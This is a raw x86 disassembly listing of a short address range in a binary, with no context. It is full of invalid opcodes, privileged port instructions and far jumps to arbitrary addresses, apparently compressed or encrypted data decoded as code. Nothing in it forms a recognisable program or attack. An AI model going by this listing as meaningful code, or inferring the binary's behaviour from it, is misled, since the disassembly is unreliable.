  40e498:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e499:	rcl    BYTE PTR [eax],cl
  40e49b:	int3   
  40e49c:	ins    DWORD PTR es:[edi],dx
  40e49d:	dec    edi
  40e49e:	and    cl,ah
  40e4a0:	push   eax
  40e4a1:	leave  
  40e4a2:	pop    es
  40e4a3:	rcl    BYTE PTR [edi-0x5aca6995],1
  40e4a9:	add    al,0xc0
  40e4ab:	xor    BYTE PTR [eax+0x5a],bh
  40e4ae:	les    edi,FWORD PTR [edi+ebp*8-0x66949d56]
  40e4b5:	push   ebp
  40e4b6:	and    eax,0x10998971
  40e4bb:	fs xchg esi,eax
  40e4bd:	lods   al,BYTE PTR ds:[esi]
  40e4bf:	pop    esi
  40e4c0:	xchg   edx,eax
  40e4c1:	out    0x3b,al
  40e4c3:	lea    edi,[esi-0x72]
  40e4c6:	jmp    0x2c944a81
  40e4cb:	arpl   cx,ax
  40e4cd:	mov    ebp,0xb240497b
  40e4d2:	cmp    DWORD PTR [eax],0xc05a226e
  40e4d8:	sbb    al,0x6
  40e4da:	push   cs
  40e4db:	pushf  
  40e4dc:	jns    0x40e4d4
  40e4de:	and    esi,DWORD PTR [eax-0x36]
  40e4e1:	inc    edx
  40e4e2:	pextrw eax,mm3,0xaa
  40e4e6:	adc    eax,0x62ac36d8
  40e4eb:	jbe    0x40e492
  40e4ed:	adc    DWORD PTR [edi+0x5e0e488c],edi
  40e4f3:	out    dx,al
  40e4f4:	mov    ecx,0xf93df909
  40e4f9:	adc    eax,0x14ffb1c8
  40e4fe:	inc    esi
  40e4ff:	dec    edx
  40e500:	cs mov al,0xa7
  40e503:	lods   eax,DWORD PTR ds:[esi]
  40e504:	fist   WORD PTR [esi+0x3bc8b6a6]
  40e50a:	mov    ah,0x9a
  40e50c:	xchg   BYTE PTR [eax+0x59d13c71],dl
  40e512:	xchg   ecx,eax
  40e513:	inc    eax
  40e514:	pop    es
  40e515:	pop    esp
  40e516:	xor    edx,esi
  40e518:	jne    0x40e55b
  40e51a:	ss pop edx
  40e51c:	or     al,0x46
  40e51f:	add    eax,0xc39bf7bb
  40e524:	fdiv   st,st(2)
  40e526:	lahf   
  40e527:	xlat   BYTE PTR ds:[ebx]
  40e528:	addr16 cli 
  40e52a:	mov    ah,0xcd
  40e52c:	int3   
  40e52d:	lods   al,BYTE PTR ds:[si]
  40e52f:	mov    DWORD PTR [edi+0x43],0x33d1783d
  40e536:	mov    al,0xa8
  40e538:	push   ecx
  40e539:	mov    ecx,0xa5981fcf
  40e53e:	call   0x5f90:0x80de82c6
  40e545:	(bad)
  40e548:	add    ecx,DWORD PTR [ebp-0x11998ab2]
  40e54e:	loope  0x40e4d7
  40e550:	sub    DWORD PTR [ecx-0x24],edx
  40e553:	(bad)  
  40e554:	and    dl,BYTE PTR [edi]
  40e556:	cs mov ecx,0x1721a861
  40e55c:	xor    esi,edx
  40e55e:	adc    cl,al
  40e560:	mov    edi,0xee19474f
  40e565:	push   es
  40e566:	aad    0x9d
  40e568:	jge    0x40e51a
  40e56a:	adc    esi,ebp
  40e56c:	data16 and al,0x96
  40e56f:	shl    dh,0x15
  40e572:	xchg   ecx,ecx
  40e574:	lds    ecx,FWORD PTR [ecx-0x79]
  40e577:	and    eax,ebp
  40e579:	push   ebp
  40e57a:	ins    BYTE PTR es:[edi],dx
  40e57b:	or     eax,0x791916cc
  40e580:	retf   
  40e581:	xchg   esi,eax
  40e582:	out    dx,al
  40e583:	mov    eax,0xee5b5c87
  40e588:	inc    esi
  40e589:	pusha  
  40e58a:	xor    DWORD PTR ds:0xc879184d,0xc4cf282f
  40e594:	das    
  40e595:	add    DWORD PTR [ecx+edx*1+0x5542886a],ecx
  40e59c:	cmc    
  40e59d:	push   esi
  40e59e:	jg     0x40e56f
  40e5a0:	cld    
  40e5a1:	sub    al,0x5a
  40e5a3:	xor    eax,esp
  40e5a5:	adc    al,0x7c
  40e5a7:	xchg   BYTE PTR [esi+0x11],ah
  40e5aa:	retf   
  40e5ab:	pop    eax
  40e5ac:	inc    ecx
  40e5ad:	dec    eax
  40e5ae:	dec    eax
  40e5af:	pop    edi
  40e5b0:	mov    cl,0x6f
  40e5b2:	adc    ebx,ebx
  40e5b4:	cmp    BYTE PTR [edx+edi*4],cl
  40e5b7:	das    
  40e5b8:	sbb    BYTE PTR ds:0x1b872f34,0xbe
  40e5bf:	jmp    0x40e58f
  40e5c1:	arpl   WORD PTR [esi],dx
  40e5c3:	pop    es
  40e5c4:	mov    eax,ds:0x893fa009
  40e5c9:	inc    ebx
  40e5ca:	cmp    BYTE PTR [ebx+0x4d28ad74],cl
  40e5d0:	or     eax,0xd92aafac
  40e5d5:	inc    esi
  40e5d6:	sbb    al,BYTE PTR [edx+0xc]
  40e5d9:	iret   
  40e5da:	fidiv  WORD PTR [ecx]
  40e5dc:	jne    0x40e568
  40e5de:	mov    ecx,cs
  40e5e0:	popa   
  40e5e1:	jb     0x40e5ef
  40e5e3:	dec    ebp
  40e5e4:	push   0xfffffff0
  40e5e6:	frstor [eax]
  40e5e8:	cmp    DWORD PTR [eax+0x4],ebx
  40e5eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e5ec:	in     al,0x27
  40e5ee:	dec    esi
  40e5ef:	repnz push ebp
  40e5f1:	popa   
  40e5f2:	loop   0x40e5fa
  40e5f4:	cmp    cl,0xc8
  40e5f7:	adc    al,0xf3
  40e5f9:	xor    al,0x99
  40e5fb:	and    ah,BYTE PTR [ecx+0x5bb0c039]
  40e601:	lods   eax,DWORD PTR ds:[esi]
  40e602:	popf   
  40e603:	jnp    0x40e5dd
  40e605:	add    BYTE PTR [esi+0x7a],dl
  40e608:	xlat   BYTE PTR ss:[ebx]
  40e60a:	out    dx,eax
  40e60b:	mov    al,cs:0x8accf49d
  40e611:	mov    gs,edi
  40e613:	cwde   
  40e614:	adc    eax,0x9d01469e
  40e619:	lods   eax,DWORD PTR ds:[esi]
  40e61a:	mov    dl,0x20
  40e61c:	cmp    ch,ah
  40e61e:	jge    0x40e5d3
  40e620:	lds    esi,FWORD PTR [ebx]
  40e622:	push   edi
  40e623:	dec    cx
  40e625:	ror    ebp,0x18
  40e628:	mov    dh,0x2c
  40e62a:	loope  0x40e62d
  40e62c:	mov    eax,ss
  40e62e:	mov    dh,0x7e
  40e630:	out    dx,al
  40e631:	cwde   
  40e632:	or     BYTE PTR ds:0x3019afcb,al
  40e638:	and    al,0x9a
  40e63a:	mov    al,0xd3
  40e63c:	adc    al,cl
  40e63e:	test   eax,0xcc884f05
  40e643:	inc    ebp
  40e644:	mov    cl,0xdc
  40e646:	jmp    0x15c7537a
  40e64b:	pusha  
  40e64c:	ins    BYTE PTR es:[edi],dx
  40e64d:	test   al,0xef
  40e64f:	imul   edx,DWORD PTR [esp+eiz*4],0xfffffff4
  40e653:	repnz pop es
  40e655:	shr    ebx,1
  40e657:	inc    eax
  40e658:	in     al,dx
  40e659:	and    esp,DWORD PTR [ebx-0x6f3cc9da]
  40e65f:	add    al,dl
  40e661:	in     al,dx
  40e662:	jns    0x40e68c
  40e664:	pop    ecx
  40e665:	pop    es
  40e666:	dec    eax
  40e667:	mov    ch,0x55
  40e669:	iret   
  40e66a:	fisttp QWORD PTR [edi]
  40e66c:	mov    al,0x31
  40e66e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e66f:	and    BYTE PTR [ebp+0x6b],0x16
  40e673:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e674:	cmp    esp,DWORD PTR [ecx+0x33]
  40e677:	stos   BYTE PTR es:[edi],al
  40e678:	test   eax,0xb32d8ee2
  40e67d:	dec    ebx
  40e67e:	rcr    DWORD PTR [esi-0x3e0dfe98],cl
  40e684:	xor    BYTE PTR [ebx-0x22e97739],0x77
  40e68b:	call   0x5093:0x150b1843
  40e692:	dec    eax
  40e693:	inc    ebx
  40e694:	fstp   QWORD PTR [ecx+0x5a]
  40e697:	pop    edx
  40e698:	add    BYTE PTR [esi],dl
  40e69a:	sbb    eax,DWORD PTR [edi-0x77]
  40e69d:	sbb    dl,0xaa
  40e6a0:	lahf   
  40e6a1:	sbb    DWORD PTR [eax],eax
  40e6a3:	ds push esi
  40e6a5:	adc    BYTE PTR [edi-0x65],bl
  40e6a8:	lods   al,BYTE PTR ds:[esi]
  40e6a9:	and    eax,DWORD PTR [ecx+0x16d77b1]
  40e6af:	jne    0x40e690
  40e6b1:	dec    edx
  40e6b2:	jle    0x40e697
  40e6b4:	add    eax,ecx
  40e6b6:	into   
  40e6b7:	es test ah,ch
  40e6ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e6bb:	sbb    BYTE PTR [eax-0x35],0xfc
  40e6bf:	mov    bh,0xe
  40e6c1:	in     al,dx
  40e6c2:	mov    esp,0x70031069
  40e6c7:	mov    eax,ds:0xd6ccc51b
  40e6cc:	push   edi
  40e6cd:	in     eax,dx
  40e6ce:	rcr    BYTE PTR [ebp+0x4bf61d3a],0xba
  40e6d5:	(bad)  
  40e6d7:	cmc    
  40e6d8:	test   ah,dh
  40e6da:	push   0xffffffad
  40e6dc:	pop    ebp
  40e6dd:	test   bl,ch
  40e6df:	or     al,0xed
  40e6e1:	fcmovbe st,st(1)
  40e6e3:	(bad)
  40e6e6:	mov    esp,0x1975fab4
  40e6eb:	dec    esi
  40e6ec:	stc    
  40e6ed:	imul   edx,eax,0x6c
  40e6f0:	mov    dh,0x16
  40e6f2:	fnstenv ss:[ecx+ecx*2+0xf]
  40e6f7:	inc    ebx
  40e6f8:	dec    edx
  40e6f9:	fs sti 
  40e6fb:	rcl    DWORD PTR [esi+ebx*4-0x1f79655d],cl
  40e702:	js     0x40e717
  40e704:	sti    
  40e705:	inc    DWORD PTR [esi+0x6e]
  40e708:	pop    ss
  40e709:	xor    bh,BYTE PTR [ebp+0x1d]
  40e70c:	push   ds
  40e70d:	imul   ecx,DWORD PTR [ebp-0xf6be81b],0x4f
  40e714:	nop
  40e715:	jle    0x40e73c
  40e717:	add    DWORD PTR [eax],esp
  40e719:	shl    BYTE PTR [eax+0x5c],cl
  40e71c:	js     0x40e794
  40e71e:	mov    ch,0x45
  40e720:	hlt    
  40e721:	dec    ecx
  40e722:	push   esi
  40e723:	int    0x6f
  40e725:	push   ds
  40e726:	scas   al,BYTE PTR es:[edi]
  40e727:	or     eax,0xc13e3f72
  40e72c:	push   es
  40e72d:	iret   
  40e72e:	lods   eax,DWORD PTR ds:[esi]
  40e72f:	add    DWORD PTR [ebx],esp
  40e731:	mov    eax,ecx
  40e733:	xor    DWORD PTR [ebx+0x4e],0xa9e5a5c2
  40e73a:	loope  0x40e7ba
  40e73c:	aad    0xba
  40e73e:	(bad)  
  40e740:	adc    eax,0x7e7b9991
  40e745:	push   ds
  40e746:	(bad)  
  40e748:	push   es
  40e749:	and    ebx,DWORD PTR gs:[edx]
  40e74c:	pop    ecx
  40e74d:	in     al,dx
  40e74e:	stc    
  40e74f:	jecxz  0x40e79c
  40e751:	arpl   WORD PTR [ecx],si
  40e753:	call   0x9a60:0x18dc6f6e
  40e75a:	cmp    eax,0x1d8538c7
  40e75f:	mov    dh,0x6f
  40e761:	sbb    bl,BYTE PTR [edx]
  40e763:	xchg   edx,eax
  40e764:	retf   
  40e765:	push   cs
  40e766:	ins    BYTE PTR es:[edi],dx
  40e767:	arpl   dx,si
  40e769:	leave  
  40e76a:	shl    BYTE PTR [esi-0x7c],0x3f
  40e76e:	lods   al,BYTE PTR ds:[esi]
  40e76f:	jno    0x40e70a
  40e771:	sub    BYTE PTR [edx],al
  40e773:	imul   ecx,edi,0x9dbec862
  40e779:	scas   al,BYTE PTR es:[edi]
  40e77a:	cmp    edx,DWORD PTR ds:0xb4ea5160
  40e780:	sub    DWORD PTR [edi-0x11ad3b6a],eax
  40e786:	cmp    eax,0x706a93a9
  40e78b:	sbb    eax,0xc65c1810
  40e790:	nop
  40e791:	xchg   esp,eax
  40e792:	in     al,dx
  40e793:	enter  0xfbfb,0x21
  40e797:	sbb    edx,DWORD PTR [edx+ebx*2-0x8adb87f]
  40e79e:	ins    BYTE PTR es:[edi],dx
  40e79f:	out    0x75,eax
  40e7a1:	(bad)  
  40e7a2:	mov    dh,0xdb
  40e7a4:	mov    cl,0x5c
  40e7a6:	add    eax,0x8e3bde82
  40e7ab:	adc    ch,BYTE PTR [ecx-0x52bfadd1]
  40e7b1:	pop    ebx
  40e7b2:	and    al,0xef
  40e7b4:	call   0xc866:0xe33f3ab4
  40e7bb:	inc    edi
  40e7bc:	or     DWORD PTR [ebx-0x3],esi
  40e7bf:	inc    edi
  40e7c0:	jo     0x40e822
  40e7c2:	test   BYTE PTR [ebx+eiz*2-0x66],bl
  40e7c6:	xor    ecx,DWORD PTR [ebp-0x43]
  40e7c9:	or     eax,0xb1c5d188
  40e7ce:	rcl    DWORD PTR [edx],1
  40e7d0:	sbb    eax,0x9d30237b
  40e7d5:	rol    BYTE PTR [edx+0x4d41afca],0x7d
  40e7dc:	pop    ds
  40e7dd:	call   0x2cfc:0x4510f955
  40e7e4:	out    0xc8,al
  40e7e6:	inc    esp
  40e7e7:	push   eax
  40e7e8:	mov    esp,0x8379cc24
  40e7ed:	mov    eax,0x3752105b
  40e7f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e7f3:	in     eax,0xa
  40e7f5:	push   esi
  40e7f6:	mov    ah,dh
  40e7f8:	dec    eax
  40e7f9:	nop
  40e7fa:	out    0x48,al
  40e7fc:	fbstp  TBYTE PTR [ebx]
  40e7fe:	aaa    
  40e7ff:	jno    0x40e875
  40e801:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e802:	out    dx,eax
  40e803:	jge    0x40e875
  40e805:	fsub   st(3),st
  40e807:	and    eax,0x4a5585ec
  40e80c:	xor    DWORD PTR [edi+0x22],0xc
  40e810:	call   0xe779ad35
  40e815:	cld    
  40e816:	into   
  40e817:	mov    edx,0xa34739e0
  40e81c:	add    DWORD PTR [ebp-0x2a],0x8f8838a1
  40e823:	push   ecx
  40e824:	ins    BYTE PTR es:[edi],dx
  40e825:	or     BYTE PTR [edx+0x7eb6fcba],al
  40e82b:	nop
  40e82c:	push   cs
  40e82d:	data16 imul BYTE PTR [esi+0x39]
  40e831:	push   ebx
  40e832:	cmp    BYTE PTR [ebp-0x46],cl
  40e835:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e836:	lea    ecx,[ecx+0x5e]
  40e839:	mov    cl,0x2f
  40e83b:	pop    esp
  40e83c:	xlat   BYTE PTR ds:[ebx]
  40e83d:	xchg   esi,eax
  40e83e:	add    bh,ch
  40e840:	loop   0x40e8a2
  40e842:	aaa    
  40e843:	mov    dl,0x65
  40e845:	pop    eax
  40e846:	jae    0x40e855
  40e848:	fld    DWORD PTR [ebx+ecx*2]
  40e84b:	jle    0x40e7ce
  40e84d:	test   al,0xb5
  40e84f:	shr    BYTE PTR [ebp+0x87cef58],cl
  40e855:	add    esi,ebp
  40e857:	xor    eax,0x88e168b4
  40e85c:	and    DWORD PTR [edi-0x29],0xfffffff2
  40e860:	sub    cl,BYTE PTR [edx-0x65efc1ad]
  40e866:	adc    eax,0x25e0499
  40e86b:	iret   
  40e86c:	jne    0x40e837
  40e86e:	int3   
  40e86f:	or     DWORD PTR [esi],0xb688c542
  40e875:	lock xchg DWORD PTR [edi-0x3198a4ed],edx
  40e87c:	in     al,dx
  40e87d:	pop    ss
  40e87e:	scas   eax,DWORD PTR es:[edi]
  40e87f:	popf   
  40e880:	cmp    eax,0xdc206bcf
  40e885:	loope  0x40e899
  40e887:	push   ecx
  40e888:	pusha  
  40e889:	push   es
  40e88a:	mov    esp,?
  40e88c:	inc    ebp
  40e88d:	push   cs
  40e88e:	jge    0x40e86d
  40e890:	xchg   BYTE PTR [edi],dh
  40e892:	dec    esp
  40e893:	add    DWORD PTR [ecx-0x708e6438],0x11228ab1
  40e89d:	xor    al,0x29
  40e89f:	push   ds
  40e8a0:	pop    ds
  40e8a1:	push   ds
  40e8a2:	call   0x6e7a:0x804375ce
  40e8a9:	outs   dx,DWORD PTR ds:[esi]
  40e8aa:	(bad)  
  40e8ab:	cmp    eax,DWORD PTR [ecx+0x72]
  40e8ae:	retf   0x8939
  40e8b1:	std    
  40e8b2:	leave  
  40e8b3:	inc    ecx
  40e8b4:	push   esp
  40e8b5:	mov    edx,0xb644d202
  40e8ba:	or     al,0xbe
  40e8bc:	iret   
  40e8bd:	jg     0x40e8fa
  40e8bf:	pop    ds
  40e8c0:	mov    BYTE PTR [edi+0x15],al
  40e8c3:	(bad)  
  40e8c4:	rol    al,cl
  40e8c6:	and    DWORD PTR [ebx+0x5bf283d8],eax
  40e8cc:	push   0xffffffef
  40e8ce:	adc    eax,0x2923c241
  40e8d3:	sbb    eax,0xbc2818d5
  40e8d8:	pop    edi
  40e8d9:	jbe    0x40e950
  40e8db:	int3   
  40e8dc:	nop
  40e8dd:	popa   
  40e8de:	push   ds
  40e8df:	mov    esp,0x2c1c26c4
  40e8e4:	adc    al,0x8a
  40e8e6:	add    eax,0x1ed7649a
  40e8eb:	jbe    0x40e8eb
  40e8ed:	jp     0x40e8b6
  40e8ef:	ds pushf 
  40e8f1:	push   0x84872a77
  40e8f6:	out    0x2d,al
  40e8f8:	mov    al,0x3f
  40e8fa:	sbb    al,0x8d
  40e8fc:	aad    0xab
  40e8fe:	imul   DWORD PTR [eax-0x7d]
  40e901:	pop    ds
  40e902:	(bad)  
  40e903:	addr16 mov edi,0x4a5a5621
  40e909:	xchg   ch,ch
  40e90b:	aad    0x37
  40e90d:	or     ebx,DWORD PTR [esi]
  40e90f:	rol    DWORD PTR [eax+ecx*4],1
  40e912:	push   esp
  40e913:	aam    0xe6
  40e915:	popf   
  40e916:	adc    BYTE PTR [ecx-0x546f27a],dh
  40e91c:	mov    esi,0x88074fef
  40e921:	jno    0x40e8c9
  40e923:	aad    0x4d
  40e925:	enter  0xe38,0x8d
  40e929:	push   ss
  40e92a:	dec    edx
  40e92b:	mov    edi,0xaf0d1362
  40e930:	and    ecx,DWORD PTR [edi-0x20d71567]
  40e936:	scas   eax,DWORD PTR es:[edi]
  40e937:	pop    es
  40e938:	das    
  40e939:	fdivr  QWORD PTR [ebp+0x1ae6690d]
  40e93f:	lahf   
  40e940:	out    0xa6,eax
  40e942:	fistp  QWORD PTR [ebp+0x3d]
  40e945:	push   ebp
  40e946:	dec    esp
  40e947:	inc    edx
  40e948:	dec    ecx
  40e949:	or     cl,BYTE PTR [ebx]
  40e94b:	call   0xb23b61e3
  40e950:	add    esp,DWORD PTR [eax]
  40e952:	jle    0x40e901
  40e954:	pop    ss
  40e955:	pop    ebp
  40e956:	mov    bl,BYTE PTR [edi+0x25]
  40e959:	test   al,0xc
  40e95b:	in     al,dx
  40e95c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e95d:	in     al,dx
  40e95e:	cmp    edx,DWORD PTR [edx-0x27acd825]
  40e964:	push   0x7474dee4
  40e969:	mov    dl,0x91
  40e96b:	cmp    DWORD PTR [ecx],ebp
  40e96d:	jnp    0x40e8fe
  40e96f:	pop    ds
  40e970:	or     al,0x5a
  40e972:	cmp    eax,0x4778e5f0
  40e977:	sahf   
  40e978:	mov    dx,0xc69e
  40e97c:	xor    esp,DWORD PTR [edi-0x1dd6d3f2]
  40e982:	jle    0x40e9c0
  40e984:	popa   
  40e985:	stos   DWORD PTR es:[edi],eax
  40e986:	lds    ebp,FWORD PTR [edi-0x455789ac]
  40e98c:	ins    BYTE PTR es:[edi],dx
  40e98d:	xchg   esp,eax
  40e98e:	xchg   esp,eax
  40e98f:	scas   eax,DWORD PTR es:[edi]
  40e990:	imul   esi,DWORD PTR [edi-0x68],0xdecee7da
  40e997:	(bad)  
  40e998:	and    eax,0x535e1b22
  40e99d:	sub    DWORD PTR [edi+eax*8-0x3dfd1f31],esp
  40e9a4:	out    0xf7,al
  40e9a6:	fdiv   DWORD PTR [eax+0x42cc2a65]
  40e9ac:	xor    eax,0xef3abc0
  40e9b1:	mov    ds:0x3d8fe858,eax
  40e9b6:	push   ss
  40e9b7:	adc    ch,BYTE PTR [esi-0x7]
  40e9ba:	push   ebx
  40e9bb:	ins    BYTE PTR es:[edi],dx
  40e9bc:	mov    al,ds:0x9aa8a4d9
  40e9c1:	clc    
  40e9c2:	adc    eax,0xbe789340
  40e9c7:	sub    DWORD PTR ds:0x3f81bdcf,esi
  40e9cd:	mov    bh,BYTE PTR [edi-0x28]
  40e9d0:	out    0xb7,al
  40e9d2:	push   cs
  40e9d3:	cmc    
  40e9d4:	bound  ebp,QWORD PTR [edi+ebx*1-0x19775513]
  40e9db:	sub    ch,cl
  40e9dd:	mov    dl,0xb9
  40e9df:	pop    ecx
  40e9e0:	popa   
  40e9e1:	mov    ds:0x3830a4a,al
  40e9e6:	les    ebp,FWORD PTR [edx+0x78695e54]
  40e9ec:	cmp    BYTE PTR [ecx+0x37],ah
  40e9ef:	fist   DWORD PTR [esi]
  40e9f1:	push   esp
  40e9f2:	xor    al,0x39
  40e9f4:	adc    BYTE PTR [ebp+0x316fd202],0x6c
  40e9fb:	jg     0x40e985
  40e9fd:	dec    ebp
  40e9fe:	lahf   
  40e9ff:	scas   eax,DWORD PTR es:[edi]
  40ea00:	inc    edi
  40ea01:	mov    edi,DWORD PTR [eax+ecx*1-0x72]
  40ea05:	nop
  40ea06:	(bad)  
  40ea07:	mov    DWORD PTR [ebx-0x658476f1],edi
  40ea0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea0e:	mov    ebx,0x763fe87a
  40ea13:	adc    eax,0xd85dac81
  40ea18:	ret    0x1af4
  40ea1b:	xchg   esp,eax
  40ea1c:	cmp    ebx,DWORD PTR [eax+ecx*8+0x7a]
  40ea20:	vshufps ymm3,ymm4,YMMWORD PTR [ebx-0x40],0xfe
  40ea26:	adc    DWORD PTR [edi],edi
  40ea28:	xchg   ebp,eax
  40ea29:	sbb    eax,0x1b87df58
  40ea2e:	(bad)
  40ea32:	push   ebx
  40ea33:	aam    0x43
  40ea35:	rol    BYTE PTR [edi+0x45a8908c],1
  40ea3b:	push   esi
  40ea3c:	mov    fs,WORD PTR [esi]
  40ea3e:	adc    ecx,DWORD PTR [edi-0x4]
  40ea41:	sub    cl,BYTE PTR [edx-0x7f0d9720]
  40ea47:	add    eax,0x90bfe9cd
  40ea4c:	test   al,0x96
  40ea4e:	pop    esp
  40ea4f:	jne    0x40e9fd
  40ea51:	out    0x87,al
  40ea53:	repnz pop edx
  40ea55:	stos   BYTE PTR es:[edi],al
  40ea56:	pop    ecx
  40ea57:	add    edx,DWORD PTR [esi-0x1e]
  40ea5a:	and    edi,esi
  40ea5c:	ffreep st(2)
  40ea5e:	shl    bl,cl
  40ea60:	pop    ss
  40ea61:	retf   0x18ac
  40ea64:	popf   
  40ea65:	or     al,0xe4
  40ea67:	add    al,bl
  40ea69:	dec    ebx
  40ea6a:	clc    
  40ea6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea6c:	ins    DWORD PTR es:[edi],dx
  40ea6d:	(bad)  [eax-0xb]
  40ea70:	mov    al,ds:0x8d9b069
  40ea75:	outs   dx,BYTE PTR ds:[esi]
  40ea76:	ret    0x7b57
  40ea79:	imul   edi,esp,0x75
  40ea7c:	ror    edx,1
  40ea7e:	adc    DWORD PTR [ecx+0x31],0x48d593c6
  40ea85:	cmp    BYTE PTR [ebp-0x7560bbc8],0x3d
  40ea8c:	mov    DWORD PTR [ebp+0x705fe37f],eax
  40ea92:	fwait
  40ea93:	and    esp,DWORD PTR [edi+0x8]
  40ea96:	adc    esp,DWORD PTR [edx]
  40ea98:	ins    BYTE PTR es:[edi],dx
  40ea99:	push   es
  40ea9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea9b:	hlt    
  40ea9c:	pop    ecx
  40ea9d:	or     esi,DWORD PTR [edx+0x63a23c68]
  40eaa3:	xchg   ecx,eax
  40eaa4:	pushf  
  40eaa5:	jbe    0x40ead6
  40eaa7:	lods   al,BYTE PTR ds:[esi]
  40eaa8:	or     cl,al
  40eaaa:	sbb    dl,BYTE PTR [ebp-0x59]
  40eaad:	and    ch,ch
  40eaaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eab0:	jmp    0x40ea3c
  40eab2:	xor    al,bh
  40eab4:	cwde   
  40eab5:	sub    BYTE PTR [edx],0xa1
  40eab8:	icebp  
  40eab9:	in     eax,dx
  40eaba:	push   edx
  40eabb:	mov    dl,0x84
  40eabd:	dec    ecx
  40eabe:	fcomp  DWORD PTR [esi-0x3d485]
  40eac4:	mov    fs,esp
  40eac6:	outs   dx,BYTE PTR ds:[esi]
  40eac7:	jns    0x40eae4
  40eac9:	mov    ecx,0x9deedc35
  40eace:	ret    
  40eacf:	jmp    0x40eab7
  40ead1:	push   0xf58f415e
  40ead6:	adc    eax,0xeda0b19e
  40eadb:	jo     0x40eacb
  40eadd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eade:	push   DWORD PTR [ebx+eiz*4+0x72]
  40eae2:	jge    0x40eaeb
  40eae4:	push   esp
  40eae5:	cmc    
  40eae6:	add    eax,0xce562c94
  40eaeb:	or     eax,0xe1e6d0be
  40eaf0:	jmp    0x40eb4d
  40eaf2:	mov    cs:0x8b59ba51,al
  40eaf8:	arpl   WORD PTR [eax-0x15],ax
  40eafb:	mov    edx,ebp
  40eafd:	mov    ds:0x1137d17e,al
  40eb02:	mov    bl,BYTE PTR [esi]
  40eb04:	int    0x52
  40eb06:	mov    ebp,0xb096172d
  40eb0b:	sub    ch,BYTE PTR [ebx]
  40eb0d:	test   BYTE PTR [esp+esi*2+0x58abfc4],bh
  40eb14:	jg     0x40eb4a
  40eb16:	loopne 0x40eb05
  40eb18:	mov    al,ds:0x990a4982
  40eb1d:	out    dx,al
  40eb1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb1f:	out    dx,al
  40eb20:	ss retf 
  40eb22:	cmp    dh,BYTE PTR cs:[esi+0x3c]
  40eb26:	dec    edi
  40eb27:	imul   eax,DWORD PTR ds:0xba17f985,0xffffff8b
  40eb2e:	push   0xffffffae
  40eb30:	ret    
  40eb31:	fnsave [eax]
  40eb33:	outs   dx,BYTE PTR ds:[esi]
  40eb34:	jnp    0x40eb9f
  40eb36:	shl    DWORD PTR [esi+0x1],0x65
  40eb3a:	iret   
  40eb3b:	inc    ebx
  40eb3c:	inc    edi
  40eb3d:	jge    0x40eb3c
  40eb3f:	sub    BYTE PTR [esi],bl
  40eb41:	iret   
  40eb42:	mov    al,BYTE PTR [edi]
  40eb44:	into   
  40eb45:	jg     0x40eb11
  40eb47:	mov    ds:0xb2aca3ed,eax
  40eb4c:	ror    BYTE PTR [edx],1
  40eb4e:	pop    ebx
  40eb4f:	paddsw mm0,QWORD PTR [ebx]
  40eb52:	rol    BYTE PTR gs:[edi],cl
  40eb55:	daa    
  40eb56:	jle    0x40eb54
  40eb58:	pop    esi
  40eb59:	adc    al,0x25
  40eb5b:	ins    BYTE PTR es:[edi],dx
  40eb5c:	popf   
  40eb5d:	jp     0x40eb0d
  40eb5f:	(bad)  
  40eb60:	xchg   ebp,eax
  40eb61:	adc    dh,0xcd
  40eb64:	adc    dh,BYTE PTR ds:0x165ee9aa
  40eb6a:	das    
  40eb6b:	mov    dh,0x6
  40eb6d:	push   esi
  40eb6e:	call   0xff11d744
  40eb73:	loope  0x40eb41
  40eb75:	(bad)  
  40eb76:	push   edx
  40eb77:	push   0x80618005
  40eb7c:	test   eax,0x36924543
  40eb81:	mov    eax,0x6a5c7479
  40eb86:	mov    eax,ds:0xc15cbc29
  40eb8b:	cmp    eax,DWORD PTR [ebp+0x2fc74037]
  40eb91:	pop    es
  40eb92:	push   esi
  40eb93:	xchg   esi,eax
  40eb94:	adc    BYTE PTR [edx],ch
  40eb96:	mov    ds:0x53bd5705,al
  40eb9b:	es jecxz 0x40eb87
  40eb9e:	push   ebp
  40eb9f:	dec    DWORD PTR [ecx]
  40eba1:	jp     0x40eb6f
  40eba3:	mov    al,ds:0x80bad138
  40eba8:	mov    ds:0xcc8a7925,al
  40ebad:	add    al,0x6b
  40ebaf:	frstor [ecx-0x5]
  40ebb2:	mov    esp,0x7102ad23
  40ebb7:	ja     0x40ebd1
  40ebb9:	retf   
  40ebba:	pop    esp
  40ebbb:	jle    0x40ec15
  40ebbd:	(bad)  
  40ebbf:	(bad)  
  40ebc0:	neg    BYTE PTR [edx+0x4e13e9f8]
  40ebc6:	sahf   
  40ebc7:	ret    
  40ebc8:	fidivr DWORD PTR [eax-0x22]
  40ebcb:	loopne 0x40eb63
  40ebcd:	sub    dl,cl
  40ebcf:	cs pop ss
  40ebd1:	mov    ebx,0xdf33a3cb
  40ebd6:	xor    eax,0xaf1bc88d
  40ebdb:	mov    bl,0x5f
  40ebdd:	mov    BYTE PTR [ecx],cl
  40ebdf:	push   esi
  40ebe0:	adc    ch,BYTE PTR [eax+0x4ba0198]
  40ebe6:	mov    DWORD PTR [edx+0x20cae548],edx
  40ebec:	ds push esp
  40ebee:	ins    BYTE PTR es:[edi],dx
  40ebef:	xor    esi,0xee9af6a5
  40ebf5:	into   
  40ebf6:	inc    DWORD PTR [edx]
  40ebf8:	pop    ecx
  40ebf9:	outs   dx,BYTE PTR ds:[esi]
  40ebfa:	inc    esi
  40ebfb:	repnz (bad) 
  40ebfd:	mov    ebp,0x24a43710
  40ec02:	rcl    bl,1
  40ec04:	add    ecx,DWORD PTR [edx+0x7e4c9694]
  40ec0a:	jp     0x40ec05
